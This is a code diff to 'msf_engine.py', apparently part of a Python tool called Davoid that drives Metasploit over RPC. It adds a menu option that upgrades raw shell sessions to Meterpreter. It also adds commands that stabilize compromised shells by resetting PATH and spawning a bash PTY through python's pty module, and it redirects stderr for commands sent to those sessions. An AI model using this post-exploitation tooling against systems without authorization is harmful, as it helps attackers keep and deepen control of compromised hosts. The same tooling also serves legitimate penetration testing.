@@ -1,9 +1,3 @@
-"""
-msf_engine.py — Davoid Metasploit RPC Orchestrator
-Full production rewrite: reliable shell I/O, bind/reverse awareness,
-robust polling, clean interactive REPL, zero silent failures.
-"""
-
 import os
 import re
 import sys
@@ -930,6 +924,25 @@ class MetasploitRPCEngine:
                 questionary.press_any_key_to_continue(style=Q_STYLE).ask()
                 return
 
+        if stype == 'shell':
+            action = questionary.select(
+                "Raw Shell Quick Actions:",
+                choices=[
+                    "1. Interactive Shell",
+                    "2. Upgrade to Meterpreter (shell_to_meterpreter)",
+                ],
+                style=Q_STYLE
+            ).ask()
+
+            if action and "Upgrade" in action:
+                console.print(
+                    "[cyan]Attempting to upgrade shell to Meterpreter...[/cyan]")
+                con = self._new_console()
+                con.write("use post/multi/manage/shell_to_meterpreter\n")
+                con.write(f"set SESSION {sid}\n")
+                con.write("run\n")
+                return
+
         # ── Full interactive REPL ──────────────────────────
         prompt_label = "meterpreter" if stype == "meterpreter" else "shell"
 
@@ -947,7 +960,12 @@ class MetasploitRPCEngine:
         # Prime raw shells with a newline to get an initial prompt
         if stype != 'meterpreter':
             try:
-                shell.write('\n')
+                shell.write(
+                    'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n')
+                time.sleep(0.5)
+                shell.write(
+                    'python -c \'import pty; pty.spawn("/bin/bash")\' || python3 -c \'import pty; pty.spawn("/bin/bash")\'\n')
+                time.sleep(1.0)
                 initial = self._drain_shell(shell, timeout=3.0, min_wait=0.5)
                 if initial.strip():
                     clean = re.sub(r'\x1b\[[0-9;]*[mGKHF]', '', initial)
@@ -1005,7 +1023,10 @@ class MetasploitRPCEngine:
             # ── Raw shell commands ─────────────────────────
             else:
                 try:
-                    shell.write(cmd + '\n')
+                    if not cmd.endswith("2>&1"):
+                        shell.write(cmd + ' 2>&1\n')
+                    else:
+                        shell.write(cmd + '\n')
 
                     # Adaptive timeout — slow commands get more time
                     first_word = cmd.strip().split()[
